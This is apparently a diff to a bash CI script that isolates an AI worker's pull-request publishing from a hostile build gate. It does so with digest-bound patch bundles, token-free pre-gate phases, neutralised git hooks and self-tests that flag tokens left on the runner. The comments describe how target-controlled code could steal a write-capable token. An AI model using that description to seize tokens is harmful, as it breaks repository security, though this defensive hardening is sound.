@@ -1005,13 +1005,24 @@ _assert_dockerfile_pinned() {
 # an earlier step (the gate) fails. Post-gate token-refresh + followups steps must therefore carry an
 # explicit always() to survive a failed gate; this extractor lets the self-test assert that they do
 # (and that a genuinely gate-gated step like `pr` does NOT), catching a regression to implicit-success.
-# Buffers per step (a step spans `- name:` to the next `- name:`) and returns the `if:` of the step
-# containing the exact `id:`; empty when the step or its `if:` is absent.
+# Buffers per step (a step spans `- name:` to the next `- name:`, or to the end of its JOB) and
+# returns the `if:` of the step containing the exact `id:`; empty when the step or its `if:` is
+# absent.
+#
+# [issue #575] The JOB boundary — a two-space-indented key — closes the step as well. Without it a
+# step that is the LAST one in its job never saw a closing `- name:`, so the scan ran on into the
+# following jobs and the END block reported whichever JOB-LEVEL `if:` it had seen most recently:
+# a confidently wrong expression for a step that has none of it. Every assertion built on this
+# extractor would then be measuring another job's condition.
 _workflow_step_if() {
   local file="$1" id="$2"
   [[ -f "$file" ]] || { printf 'worker-live: workflow file missing: %s\n' "$file" >&2; return 1; }
   # `exit` also runs awk's END block, so guard the END print with `found` to avoid a double print.
   awk -v id="$id" '
+    /^  [A-Za-z0-9_-]+:[[:space:]]*$/ {
+      if (started && has_id) { print ifv; found=1; exit }
+      started=0; has_id=0; ifv=""; next
+    }
     /^[[:space:]]*-[[:space:]]+name:/ {
       if (started && has_id) { print ifv; found=1; exit }
       started=1; has_id=0; ifv=""; next
@@ -1020,6 +1031,20 @@ _workflow_step_if() {
     started && /^[[:space:]]*if:/ { ln=$0; sub(/^[[:space:]]*if:[[:space:]]*/,"",ln); ifv=ln }
     END { if (started && has_id && !found) print ifv }
   ' "$file"
+}
+
+# PURE (self-tested): print every `GH_TOKEN:` assignment that appears AFTER the hostile gate step
+# and BEFORE the next job begins. Issue #575's whole finding is that gated, target-controlled code
+# ran in the same job as a token-bearing publisher; the invariant this encodes is that the worker
+# job holds NO token at all once the gate has run, so the expected output is EMPTY. The job
+# boundary is a two-space-indented `name:` key, which is why the isolated `publish` job's own
+# (legitimate) tokens are not counted.
+_tokens_after_gate() {
+  awk '
+    /worker-live\.sh gate$/ { after=1; next }
+    after && /^  [A-Za-z0-9_-]+:[[:space:]]*$/ { after=0 }
+    after && /^[[:space:]]*GH_TOKEN:/ { print }
+  ' "$1"
 }
 
 # [issue #140 review r1] The gate below FAILS CLOSED when a workflow changed and actionlint is
@@ -1243,12 +1268,40 @@ coauthor_for() {
   esac
 }
 
-# Shared host-side commit + authenticated push (used by publish_pr and push_fix). The askpass
-# helper keeps the App token out of argv and the remote URL. Optional 4th/5th args (conflict-
-# repair path, fix kind=rebase): a .beads BASELINE ref — the merged default branch legitimately
-# carries .beads churn, so the tree must MATCH that ref there instead of being untouched — and a
-# 40-hex --force-with-lease guard (CAS push against the dispatched head; the merge commit itself
-# is a fast-forward, the lease only defends the race where someone pushed after dispatch).
+# Authenticated push, extracted so BOTH token-bearing callers share one askpass implementation
+# (`_git_commit_and_push` on the review-fix lane, `publish_pr` on the isolated publisher job of
+# issue #575). The askpass helper keeps the App token out of argv and out of the remote URL.
+_git_push_authenticated() {
+  local worker_root=$1 branch=$2 push_lease=${3:-}
+  [[ -n ${GH_TOKEN:-} ]] || die 'target-scoped App token is missing'
+  [[ -n "$worker_root" && "$worker_root" != / && -d "$worker_root" ]] || die 'WORKER_ROOT is unsafe'
+  [[ "$branch" =~ ^[A-Za-z0-9._/-]+$ ]] || die 'unsafe push branch'
+  [[ -z "$push_lease" || "$push_lease" =~ ^[0-9a-f]{40}$ ]] || die 'unsafe push lease sha'
+  local askpass="$worker_root/git-askpass.sh"
+  cat > "$askpass" <<'ASKPASS'
+#!/usr/bin/env bash
+case "$1" in
+  *Username*) printf '%s\n' 'x-access-token' ;;
+  *) printf '%s\n' "$GH_TOKEN" ;;
+esac
+ASKPASS
+  chmod 700 "$askpass"
+  local push_args=(push origin "HEAD:refs/heads/$branch")
+  [[ -z "$push_lease" ]] ||
+    push_args=(push "--force-with-lease=refs/heads/$branch:$push_lease" origin "HEAD:refs/heads/$branch")
+  GIT_ASKPASS="$askpass" GIT_TERMINAL_PROMPT=0 git "${push_args[@]}"
+}
+
+# Shared host-side commit + authenticated push (used by push_fix). The optional 4th/5th args
+# (conflict-repair path, fix kind=rebase): a .beads BASELINE ref — the merged default branch
+# legitimately carries .beads churn, so the tree must MATCH that ref there instead of being
+# untouched — and a 40-hex --force-with-lease guard (CAS push against the dispatched head; the
+# merge commit itself is a fast-forward, the lease only defends the race where someone pushed
+# after dispatch).
+#
+# NOTE (issue #575): the worker PUBLISH lane no longer routes through this helper. Its commit is
+# reconstructed on a separate, target-code-free publisher runner from a digest-bound patch, with
+# git hooks neutralised — see bundle_work()/publish_pr() below.
 _git_commit_and_push() {
   local branch=$1 message=$2 trailer=$3 beads_baseline_ref=${4:-} push_lease=${5:-}
   local worker_root=${WORKER_ROOT:-}
@@ -1274,53 +1327,194 @@ _git_commit_and_push() {
   [[ -n "$(git diff --cached --name-only)" ]] || die 'no staged changes to publish'
   git commit -m "$message" -m "$trailer"
 
-  local askpass="$worker_root/git-askpass.sh"
-  cat > "$askpass" <<'ASKPASS'
-#!/usr/bin/env bash
-case "$1" in
-  *Username*) printf '%s\n' 'x-access-token' ;;
-  *) printf '%s\n' "$GH_TOKEN" ;;
-esac
-ASKPASS
-  chmod 700 "$askpass"
-  local push_args=(push origin "HEAD:refs/heads/$branch")
-  [[ -z "$push_lease" ]] ||
-    push_args=(push "--force-with-lease=refs/heads/$branch:$push_lease" origin "HEAD:refs/heads/$branch")
-  GIT_ASKPASS="$askpass" GIT_TERMINAL_PROMPT=0 git "${push_args[@]}"
+  _git_push_authenticated "$worker_root" "$branch" "$push_lease"
 }
 
-publish_pr() {
-  require_target
-  local issue_file=${WORKER_ISSUE_FILE:-}
-  local issue_number=${ISSUE_NUMBER:-}
-  local branch=${WORKER_BRANCH:-}
-  local default_branch=${TARGET_DEFAULT_BRANCH:-}
-  local bot_login=${TARGET_BOT_LOGIN:-}
-  local bot_id=${TARGET_BOT_ID:-}
-  local model_alias=${WORKER_MODEL_ALIAS:-}
-  local provider_model=${WORKER_PROVIDER_MODEL:-}
-  local agent=${WORKER_AGENT:-}
-  local gate=${GATE_PROFILE:-}
-  local worker_root=${WORKER_ROOT:-}
-  local target_repo=${TARGET_REPO:-}
-  local arm_requested=${ARM_AUTO_MERGE_REQUESTED:-false}
-  [[ -n ${GH_TOKEN:-} ]] || die 'target-scoped App token is missing'
-  [[ -f "$issue_file" && ! -L "$issue_file" ]] || die 'verified issue snapshot is missing'
-  [[ "$issue_number" =~ ^[1-9][0-9]*$ ]] || die 'unsafe issue number'
-  [[ "$branch" =~ ^[A-Za-z0-9._/-]+$ ]] || die 'unsafe worker branch'
-  safe_atom "$default_branch" || die 'unsafe target default branch'
-  [[ "$bot_id" =~ ^[0-9]+$ ]] || die 'unsafe target bot id'
-  [[ "$bot_login" =~ ^[A-Za-z0-9_.-]+\[bot\]$ ]] || die 'unsafe target bot login'
-  [[ "$target_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe target repo'
-  printf '::add-mask::%s\n' "$GH_TOKEN"
+# ---- issue #575: the model's work crosses the hostile/token boundary as INERT DATA --------------
+# The `worker` job runs the target's OWN gate (arbitrary target-controlled build scripts and tests)
+# on the runner. From that moment everything on that runner is attacker-writable: the sibling
+# `registry/` checkout (so the publisher SCRIPT itself), $GITHUB_ENV/$GITHUB_PATH, the target
+# worktree, `.git/hooks`, and any process the gate detaches. Publishing a token-bearing
+# commit/push/PR in that job therefore handed gated target code a contents/workflows/issues/PR
+# capable App token and an arbitrary post-gate publish surface.
+#
+# The publisher now lives in its own job on a FRESH runner that executes no target code and no
+# target-writable script. The only thing that crosses is a BUNDLE DIRECTORY of plain data:
+#
+#   patch.diff     unified `git diff --cached --binary` of the model's work against the base
+#   meta.json      target repo, base SHA, head branch, issue, model alias (host-derived)
+#   pr-title.txt   host-built Conventional-Commits title
+#   pr-body.md     host-built PR body
+#   followups.jsonl (optional) the model's declared out-of-scope work
+#
+# Nothing in it is executable and nothing in it is run: the publisher reconstructs the commit with
+# `git apply` onto a fresh checkout of the base, with git hooks neutralised. The bundle is sealed
+# PRE-GATE by `bundle_work` (which refuses to run with a token at all) and its digest is emitted as
+# a PRE-GATE STEP OUTPUT — captured by the runner before the hostile step starts, so no later step
+# can alter it. `verify_bundle` re-derives that digest from the downloaded artifact BEFORE the
+# publisher mints any token; every refusal skips publish, leaving pr_url empty so the always()
+# `final_state` job converges the issue to status:deferred.
 
-  local impl_provider=${WORKER_PROVIDER:-}
-  [[ "$impl_provider" == anthropic || "$impl_provider" == openai ]] ||
-    die 'unsafe implementation provider'
-  local pr_title_file="$worker_root/pr-title.txt"
-  local pr_body_file="$worker_root/pr-body.md"
-  python3 - "$issue_file" "$pr_title_file" "$pr_body_file" "$issue_number" "$agent" \
-    "$model_alias" "$provider_model" "$gate" "$arm_requested" "$impl_provider" <<'PY'
+# PURE (self-tested): print the sha256 manifest digest of a bundle DIRECTORY — sha256 over the
+# sorted `<sha256-of-content>  <relpath>` listing of every regular file below it. Contents, names
+# AND the file set are all bound: editing one byte, adding a file, dropping a file, or renaming one
+# flips the digest. A missing directory, a symlink, or any non-regular entry is a hard refusal
+# (fail closed) rather than a silently skipped entry.
+_bundle_digest() {
+  python3 - "$1" <<'PY'
+import hashlib
+import os
+import sys
+
+root = sys.argv[1]
+if os.path.islink(root) or not os.path.isdir(root):
+    sys.stderr.write("worker-live: bundle directory is missing or not a directory\n")
+    raise SystemExit(1)
+entries = []
+for dirpath, dirnames, filenames in os.walk(root):
+    for name in sorted(dirnames):
+        if os.path.islink(os.path.join(dirpath, name)):
+            sys.stderr.write("worker-live: bundle contains a symlinked directory\n")
+            raise SystemExit(1)
+    dirnames.sort()
+    for name in sorted(filenames):
+        full = os.path.join(dirpath, name)
+        rel = os.path.relpath(full, root).replace(os.sep, "/")
+        if os.path.islink(full) or not os.path.isfile(full):
+            sys.stderr.write("worker-live: bundle entry is not a regular file: %s\n" % rel)
+            raise SystemExit(1)
+        with open(full, "rb") as handle:
+            entries.append("%s  %s" % (hashlib.sha256(handle.read()).hexdigest(), rel))
+manifest = "".join(line + "\n" for line in sorted(entries)).encode("utf-8")
+print(hashlib.sha256(manifest).hexdigest())
+PY
+}
+
+# PURE (self-tested): total byte size of every regular file in a bundle directory.
+_bundle_total_bytes() {
+  python3 - "$1" <<'PY'
+import os
+import sys
+
+total = 0
+for dirpath, _dirnames, filenames in os.walk(sys.argv[1]):
+    for name in filenames:
+        total += os.path.getsize(os.path.join(dirpath, name))
+print(total)
+PY
+}
+
+# PURE (self-tested): prove a downloaded bundle is EXACTLY what the pre-gate step recorded.
+# Prints `ok` and exits 0, or prints `defer: <reason>` and exits 1. Every arm is a REFUSAL: a
+# missing/unreadable artifact, an oversized one, a digest mismatch, a target-repo/base-SHA/branch/
+# issue drift, an unusable patch, or a MISSING EXPECTATION (an empty pre-gate digest means the
+# recording step never ran, which is the missing-artifact case, not a free pass).
+_bundle_verify_verdict() {
+  local dir=$1 expect_digest=$2 expect_repo=$3 expect_base=$4 expect_branch=$5 expect_issue=$6 \
+    max_bytes=$7
+  local actual
+  if ! actual=$(_bundle_digest "$dir" 2>/dev/null); then
+    printf 'defer: bundle artifact is missing or unreadable\n'
+    return 1
+  fi
+  python3 - "$dir" "$actual" "$expect_digest" "$expect_repo" "$expect_base" "$expect_branch" \
+    "$expect_issue" "$max_bytes" <<'PY'
+import json
+import os
+import re
+import sys
+
+(root, actual_digest, expect_digest, expect_repo, expect_base, expect_branch, expect_issue,
+ max_bytes) = sys.argv[1:]
+
+
+def defer(reason):
+    print("defer: " + reason)
+    raise SystemExit(1)
+
+
+# The EXPECTATIONS come from the pre-gate step outputs + the workflow inputs. An empty or malformed
+# one is a refusal: an absent pre-gate recording cannot authorize a publish.
+if not re.fullmatch(r"[0-9a-f]{64}", expect_digest or ""):
+    defer("no pre-gate bundle digest was recorded (fail closed)")
+if not re.fullmatch(r"[0-9a-f]{40}", expect_base or ""):
+    defer("no pre-gate base SHA was recorded (fail closed)")
+if not re.fullmatch(r"[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+", expect_repo or ""):
+    defer("expected target repository is missing or unsafe")
+if not re.fullmatch(r"[A-Za-z0-9._/-]+", expect_branch or ""):
+    defer("expected head branch is missing or unsafe")
+if not re.fullmatch(r"[1-9][0-9]*", expect_issue or ""):
+    defer("expected issue number is missing or unsafe")
+
+for name in ("meta.json", "patch.diff", "pr-title.txt", "pr-body.md"):
+    path = os.path.join(root, name)
+    if os.path.islink(path) or not os.path.isfile(path):
+        defer("bundle artifact is missing %s" % name)
+
+try:
+    limit = int(max_bytes)
+except (TypeError, ValueError):
+    limit = 0
+if limit <= 0:
+    defer("bundle size limit is not configured (fail closed)")
+total = 0
+for dirpath, _dirnames, filenames in os.walk(root):
+    for name in filenames:
+        total += os.path.getsize(os.path.join(dirpath, name))
+if total > limit:
+    defer("bundle artifact is oversized (%d > %d bytes)" % (total, limit))
+
+if actual_digest != expect_digest:
+    defer("bundle digest mismatch — the artifact is NOT the pre-gate recording "
+          "(recorded %s…, downloaded %s…)" % (expect_digest[:12], actual_digest[:12]))
+
+try:
+    with open(os.path.join(root, "meta.json"), encoding="utf-8") as handle:
+        meta = json.load(handle)
+except (OSError, ValueError):
+    defer("bundle meta record is unreadable")
+if not isinstance(meta, dict) or meta.get("version") != 1:
+    defer("bundle meta record has an unsupported version")
+if meta.get("target_repo") != expect_repo:
+    defer("bundle target repository drift (%r)" % (meta.get("target_repo"),))
+if meta.get("base_sha") != expect_base:
+    defer("bundle base SHA drift (%r)" % (meta.get("base_sha"),))
+if meta.get("branch") != expect_branch:
+    defer("bundle head branch drift (%r)" % (meta.get("branch"),))
+if str(meta.get("issue")) != expect_issue:
+    defer("bundle issue drift (%r)" % (meta.get("issue"),))
+if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]*", str(meta.get("model_alias") or "")):
+    defer("bundle model alias is missing or unsafe")
+
+# Patch shape + path safety. `git apply` refuses `.git` paths itself, but this is the LAST check
+# that runs before a token exists, so it refuses independently — and it refuses the QUOTED header
+# form (control/non-ASCII bytes) that the rest of the newline-framed pipeline cannot represent,
+# exactly as _porcelain_changed_paths refuses a newline in a changed path.
+try:
+    text = open(os.path.join(root, "patch.diff"), encoding="utf-8").read()
+except (OSError, UnicodeDecodeError):
+    defer("bundle patch is unreadable or is not valid UTF-8")
+headers = [line for line in text.splitlines() if line.startswith("diff --git ")]
+if not headers:
+    defer("bundle patch contains no diff (nothing to publish)")
+FORBIDDEN = re.compile(r"(?:^|[/ ])(?:\.\.|\.git|\.beads)(?:[/ ]|$)", re.IGNORECASE)
+for line in headers:
+    rest = line[len("diff --git "):]
+    if '"' in rest or "\\" in rest:
+        defer("bundle patch carries a quoted/escaped header path — refusing")
+    if FORBIDDEN.search(rest):
+        defer("bundle patch touches a forbidden path (.git/.beads/..) — refusing")
+
+print("ok")
+PY
+}
+
+# Builds the Conventional-Commits PR title + the DRAFT PR body from the host-verified issue
+# snapshot. Extracted from the old in-worker publish so it can run PRE-GATE, on the worker, with no
+# token: its output is sealed into the digest-bound bundle rather than being regenerated on the
+# publisher from state the gate could have touched.
+_write_pr_title_body() {
+  python3 - "$@" <<'PY'
 import json
 import re
 from pathlib import Path
@@ -1392,21 +1586,209 @@ Path(body_file).write_text(body, encoding="utf-8")
 Path(title_file).chmod(0o600)
 Path(body_file).chmod(0o600)
 PY
+}
 
-  _git_commit_and_push "$branch" \
-    "feat: resolve target issue #$issue_number [$model_alias]" \
-    "Co-Authored-By: $(coauthor_for "$model_alias")"
+# PHASE 1 (worker job, PRE-GATE, NO TOKEN): seal the model's work as inert, digest-bound data.
+bundle_work() {
+  require_target
+  local issue_file=${WORKER_ISSUE_FILE:-}
+  local issue_number=${ISSUE_NUMBER:-}
+  local branch=${WORKER_BRANCH:-}
+  local default_branch=${TARGET_DEFAULT_BRANCH:-}
+  local model_alias=${WORKER_MODEL_ALIAS:-}
+  local provider_model=${WORKER_PROVIDER_MODEL:-}
+  local agent=${WORKER_AGENT:-}
+  local gate=${GATE_PROFILE:-}
+  local worker_root=${WORKER_ROOT:-}
+  local target_repo=${TARGET_REPO:-}
+  local arm_requested=${ARM_AUTO_MERGE_REQUESTED:-false}
+  local impl_provider=${WORKER_PROVIDER:-}
+  local max_bytes=${WORKER_BUNDLE_MAX_BYTES:-20971520}
 
-  local pr_url pr_number head_sha
+  # TOKEN-FREE BY CONSTRUCTION (AC1/AC4). This phase shares a runner with the hostile gate, so it
+  # must never be handed a write-capable token; a token in scope here means the workflow regressed.
+  [[ -z ${GH_TOKEN:-} ]] || die 'bundle phase must run with NO GitHub token'
+  [[ -f "$issue_file" && ! -L "$issue_file" ]] || die 'verified issue snapshot is missing'
+  [[ "$issue_number" =~ ^[1-9][0-9]*$ ]] || die 'unsafe issue number'
+  [[ "$branch" =~ ^[A-Za-z0-9._/-]+$ ]] || die 'unsafe worker branch'
+  safe_atom "$default_branch" || die 'unsafe target default branch'
+  [[ "$target_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe target repo'
+  [[ -n "$worker_root" && "$worker_root" != / ]] || die 'WORKER_ROOT is unsafe'
+  safe_atom "$model_alias" || die 'unsafe routed model alias'
+  [[ "$impl_provider" == anthropic || "$impl_provider" == openai ]] ||
+    die 'unsafe implementation provider'
+  [[ "$max_bytes" =~ ^[1-9][0-9]*$ ]] || die 'unsafe bundle size limit'
+
+  local base_sha
+  base_sha=$(git rev-parse HEAD)
+  [[ "$base_sha" =~ ^[0-9a-f]{40}$ ]] || die 'pre-gate base sha is unsafe'
+  # The same .beads refusal the in-worker publish applied, evaluated on the UNSTAGED tree so the
+  # shipped semantics are preserved byte for byte.
+  [[ -z "$(git status --porcelain=v1 -- .beads 2>/dev/null)" ]] || die 'refusing to publish .beads changes'
+
+  local bundle_dir="$worker_root/publish-bundle"
+  rm -rf -- "$bundle_dir"
+  mkdir -p "$bundle_dir"
+
+  # STAGE → SNAPSHOT → UNSTAGE. The index is restored to HEAD before returning so the gate that
+  # runs next sees EXACTLY the worktree the model left. This is load-bearing, not tidiness:
+  # run_gate's `git diff --check` and BOTH changed-path classifiers (crate-source detection and
+  # the registry-selftest target derivation) read `git diff`/`git status`, so a committed — or
+  # permanently staged — tree would empty them and turn the gate VACUOUS. That is also why the
+  # model's commit is reconstructed on the publisher instead of being made here.
+  git add -A -- .
+  git diff --cached --check
+  [[ -n "$(git diff --cached --name-only)" ]] || { git reset --quiet; die 'no staged changes to publish'; }
+  git diff --cached --binary > "$bundle_dir/patch.diff"
+  git reset --quiet
+  [[ -z "$(git diff --cached --name-only)" ]] || die 'bundle phase failed to restore the pre-gate index'
+
+  _write_pr_title_body "$issue_file" "$bundle_dir/pr-title.txt" "$bundle_dir/pr-body.md" \
+    "$issue_number" "$agent" "$model_alias" "$provider_model" "$gate" "$arm_requested" \
+    "$impl_provider"
+
+  # Model-declared follow-ups are UNTRUSTED model output. They cross inside the SAME digest-bound
+  # bundle so the publisher can only create the lines that existed before the gate ran.
+  if [[ -f "$worker_root/followups.jsonl" && ! -L "$worker_root/followups.jsonl" ]]; then
+    cp -- "$worker_root/followups.jsonl" "$bundle_dir/followups.jsonl"
+  fi
+
+  python3 - "$bundle_dir/meta.json" "$target_repo" "$base_sha" "$branch" "$issue_number" \
+    "$default_branch" "$model_alias" "$impl_provider" <<'PY'
+import json
+from pathlib import Path
+import sys
+
+(meta_path, target_repo, base_sha, branch, issue, default_branch, model_alias,
+ impl_provider) = sys.argv[1:]
+Path(meta_path).write_text(json.dumps({
+    "version": 1,
+    "target_repo": target_repo,
+    "base_sha": base_sha,
+    "branch": branch,
+    "issue": int(issue),
+    "default_branch": default_branch,
+    "model_alias": model_alias,
+    "impl_provider": impl_provider,
+}, indent=2, sort_keys=True) + "\n", encoding="utf-8")
+PY
+
+  local total digest
+  total=$(_bundle_total_bytes "$bundle_dir")
+  [[ "$total" -le "$max_bytes" ]] ||
+    die "publish bundle is oversized ($total > $max_bytes bytes)"
+  digest=$(_bundle_digest "$bundle_dir") || die 'publish bundle digest could not be computed'
+
+  write_output bundle_dir "$bundle_dir"
+  write_output bundle_digest "$digest"
+  write_output bundle_base_sha "$base_sha"
+  write_output bundle_branch "$branch"
+  write_output bundle_bytes "$total"
+  printf 'worker-live: sealed a %s-byte publish bundle (digest %s) BEFORE the hostile gate\n' \
+    "$total" "$digest"
+}
+
+# PHASE 2a (publisher job, BEFORE any token is minted): re-derive the digest from the downloaded
+# artifact and compare it against the PRE-GATE step outputs. A refusal here fails the step, every
+# later publisher step skips, pr_url stays empty, and the always() `final_state` job converges the
+# issue to status:deferred — never an unverified publish, never a token minted for one.
+verify_bundle() {
+  local bundle_dir=${WORKER_BUNDLE_DIR:-}
+  local expect_digest=${WORKER_BUNDLE_DIGEST:-}
+  local expect_repo=${TARGET_REPO:-}
+  local expect_base=${WORKER_BUNDLE_BASE_SHA:-}
+  local expect_branch=${WORKER_BUNDLE_BRANCH:-}
+  local expect_issue=${ISSUE_NUMBER:-}
+  local max_bytes=${WORKER_BUNDLE_MAX_BYTES:-20971520}
+  [[ -z ${GH_TOKEN:-} ]] || die 'bundle verification must run BEFORE any token is minted'
+  local verdict
+  if verdict=$(_bundle_verify_verdict "$bundle_dir" "$expect_digest" "$expect_repo" \
+      "$expect_base" "$expect_branch" "$expect_issue" "$max_bytes"); then
+    write_output verified true
+    printf 'worker-live: publish bundle verified against the pre-gate record (%s)\n' "$verdict"
+    return 0
+  fi
+  write_output verified false
+  die "publish bundle REFUSED — $verdict (skipping publish; final_state converges to status:deferred)"
+}
+
+# PHASE 2b (publisher job, WITH the token): reconstruct the commit from the verified patch on a
+# fresh checkout of the pre-gate base, push it, and open the DRAFT PR. TARGET_DIR here is the
+# PUBLISHER's own checkout — no target code has ever run on this runner, and nothing in the bundle
+# is executed: `git apply` only, with hooks neutralised (never `git am --exec`, never a script).
+publish_pr() {
+  require_target
+  local bundle_dir=${WORKER_BUNDLE_DIR:-}
+  local expect_digest=${WORKER_BUNDLE_DIGEST:-}
+  local expect_base=${WORKER_BUNDLE_BASE_SHA:-}
+  local branch=${WORKER_BUNDLE_BRANCH:-}
+  local issue_number=${ISSUE_NUMBER:-}
+  local target_repo=${TARGET_REPO:-}
+  local default_branch=${TARGET_DEFAULT_BRANCH:-}
+  local bot_login=${TARGET_BOT_LOGIN:-}
+  local bot_id=${TARGET_BOT_ID:-}
+  local worker_root=${WORKER_ROOT:-}
+  local max_bytes=${WORKER_BUNDLE_MAX_BYTES:-20971520}
+
+  [[ -n ${GH_TOKEN:-} ]] || die 'target-scoped App token is missing'
+  printf '::add-mask::%s\n' "$GH_TOKEN"
+  [[ "$issue_number" =~ ^[1-9][0-9]*$ ]] || die 'unsafe issue number'
+  [[ "$target_repo" =~ ^[A-Za-z0-9_.-]+/[A-Za-z0-9_.-]+$ ]] || die 'unsafe target repo'
+  safe_atom "$default_branch" || die 'unsafe target default branch'
+  [[ "$bot_id" =~ ^[0-9]+$ ]] || die 'unsafe target bot id'
+  [[ "$bot_login" =~ ^[A-Za-z0-9_.-]+\[bot\]$ ]] || die 'unsafe target bot login'
+  [[ -n "$worker_root" && "$worker_root" != / && -d "$worker_root" ]] || die 'WORKER_ROOT is unsafe'
+
+  # RE-VERIFY (defence in depth). The dedicated pre-mint step already refused a drifted bundle;
+  # repeating the identical verdict here means a future reordering of the publisher's steps cannot
+  # silently let unverified content through.
+  local verdict
+  verdict=$(_bundle_verify_verdict "$bundle_dir" "$expect_digest" "$target_repo" \
+    "$expect_base" "$branch" "$issue_number" "$max_bytes") ||
+    die "publish bundle REFUSED at push time — $verdict"
+
+  [[ "$(git rev-parse HEAD)" == "$expect_base" ]] ||
+    die 'publisher checkout is not at the pre-gate base SHA'
+
+  local model_alias
+  model_alias=$(python3 -c 'import json,sys; print(json.load(open(sys.argv[1]))["model_alias"])' \
+    "$bundle_dir/meta.json")
+  safe_atom "$model_alias" || die 'unsafe model alias in the verified bundle'
+
+  git config user.name "$bot_login"
+  git config user.email "$bot_id+$bot_login@users.noreply.github.com"
+  # HOOKS NEUTRALISED (AC2/AC7). The publisher never runs anything the target ships: core.hooksPath
+  # is redirected for the whole checkout, repeated command-scoped on the commit, and --no-verify is
+  # passed as well. Any one of the three is sufficient; all three are cheap.
+  git config core.hooksPath /dev/null
+  git switch -c "$branch"
+  git -c core.hooksPath=/dev/null apply --binary --index --whitespace=nowarn -- \
+    "$bundle_dir/patch.diff" ||
+    die 'digest-verified patch did not apply cleanly to the pre-gate base'
+  [[ -z "$(git status --porcelain=v1 -- .beads 2>/dev/null)" ]] || die 'refusing to publish .beads changes'
+  git diff --cached --check
+  [[ -n "$(git diff --cached --name-only)" ]] || die 'reconstructed patch staged no changes'
+  git -c core.hooksPath=/dev/null commit --no-verify \
+    -m "feat: resolve target issue #$issue_number [$model_alias]" \
+    -m "Co-Authored-By: $(coauthor_for "$model_alias")"
+
+  local pr_url pr_number head_sha title
   head_sha=$(git rev-parse HEAD)
-  [[ "$head_sha" =~ ^[0-9a-f]{40}$ ]] || die 'pushed head sha is unsafe'
+  [[ "$head_sha" =~ ^[0-9a-f]{40}$ ]] || die 'reconstructed head sha is unsafe'
+  [[ "$(git rev-parse HEAD^)" == "$expect_base" ]] ||
+    die 'reconstructed commit is not rooted at the pre-gate base'
+
+  _git_push_authenticated "$worker_root" "$branch"
+
+  title=$(<"$bundle_dir/pr-title.txt")
+  [[ -n "$title" && "$title" != *$'\n'* ]] || die 'publish bundle carries an unsafe PR title'
   pr_url=$(gh pr create \
     --repo "$target_repo" \
     --base "$default_branch" \
     --head "$branch" \
     --draft \
-    --title "$(<"$pr_title_file")" \
-    --body-file "$pr_body_file")
+    --title "$title" \
+    --body-file "$bundle_dir/pr-body.md")
   [[ "$pr_url" =~ ^https://github.com/[^/]+/[^/]+/pull/[0-9]+$ ]] || die 'PR creation returned no URL'
   pr_number=${pr_url##*/}
   [[ "$pr_number" =~ ^[0-9]+$ ]] || die 'PR number could not be derived from the URL'
@@ -2010,6 +2392,42 @@ PY
   write_output rotated true
   # The identifier-free line still confirms the write without naming the account secret reference.
   printf 'worker-live: wrote the full refreshed credential back to the account secret (env dispatch-secrets)\n'
+}
+
+# PURE (self-tested): print the step id of every `worker`-job token mint that does NOT disable
+# the action's token-revocation post phase. Expected output is EMPTY.
+#
+# WHY (PR #310 round 3 blocker, the gap #575 left open). actions/create-github-app-token by
+# default registers a POST-job phase that REVOKES the installation token — authenticating WITH
+# that token. GitHub runs action post phases after ALL normal steps, i.e. AFTER the hostile gate
+# has executed target-controlled build scripts and tests on this runner. So a mint that stays
+# silent about revocation puts a credential-bearing process on the runner strictly later than
+# the gate: exactly the shape `_tokens_after_gate` exists to ban, but invisible to it, because
+# no `GH_TOKEN:` ever appears in the workflow text — the action supplies the token internally.
+# Every worker-job mint must therefore set `skip-token-revoke: true` and rely on the 60-minute
+# installation TTL plus narrow scoping instead. The isolated `publish`/`final_state` jobs keep
+# the default revoker: no target code ever runs there.
+#
+# Job boundary is a two-space-indented key (same convention as `_tokens_after_gate`), so the
+# clean jobs' own legitimate, revoking mints are deliberately not counted.
+_worker_mints_missing_revoke_skip() {
+  awk '
+    /^  [A-Za-z0-9_-]+:[[:space:]]*$/ {
+      if (injob && mint && !skip) print id
+      mint=0; skip=0; id="(unnamed)"
+      injob = ($0 ~ /^  worker:[[:space:]]*$/)
+      next
+    }
+    !injob { next }
+    /^      -[[:space:]]/ {
+      if (mint && !skip) print id
+      mint=0; skip=0; id="(unnamed)"
+    }
+    /^[[:space:]]*id:[[:space:]]/ { ln=$0; sub(/^[[:space:]]*id:[[:space:]]*/,"",ln); id=ln }
+    /^[[:space:]]*uses:[[:space:]]*actions\/create-github-app-token@/ { mint=1 }
+    /^[[:space:]]*skip-token-revoke:[[:space:]]*true[[:space:]]*$/ { skip=1 }
+    END { if (injob && mint && !skip) print id }
+  ' "$1"
 }
 
 # Non-vacuous host-side self-test: provider-model argv selection, telemetry extraction (claude
@@ -2754,25 +3172,97 @@ PY
     "$( _assert_dockerfile_pinned "$tmp/empty.Dockerfile" >/dev/null 2>&1 && echo pinned || echo unpinned)" \
     "unpinned"
 
-  # --- [issue #40] post-gate token-refresh survives a FAILED gate. app-token-post is minted before
-  # the (target-controlled, possibly >60min) gate, so publish/followups need a fresh mint AFTER the
-  # gate. That mint + the followups step must run even when the gate fails (model succeeded), so both
-  # carry an explicit always() — without it GitHub Actions implicitly success()-gates the `if` and a
-  # failed gate silently skips them, falling back to a possibly-expired token (the stale-token bug
-  # this PR fixes). Non-vacuous: the always() assertions flip red on a regression to implicit-success,
-  # and the `pr` step (correctly gate-gated, no always()) is a negative control proving the extractor
-  # reads per-step rather than matching anywhere in the file. ---
+  # --- [issue #40 -> #575] The post-gate token-TTL problem app-token-post/app-token-publish existed
+  # to solve is now solved STRUCTURALLY: the publisher is a separate job on a fresh runner, so it
+  # always starts from a brand-new mint and can never inherit a token minted before a >60-minute
+  # gate. The #40 PROPERTY that survives — a followups-only run (model succeeded, gate FAILED) must
+  # still file the model's declared follow-ups — is asserted on the publisher's followups step,
+  # which needs its explicit always() for exactly the old reason: without a status function GitHub
+  # implicitly success()-gates the `if`, and a failed gate would skip it. The `pr` step (correctly
+  # gate-gated, no always()) is the negative control proving the extractor reads per-step rather
+  # than matching anywhere in the file. ---
   local wf="$SCRIPT_DIR/../.github/workflows/worker.yml"
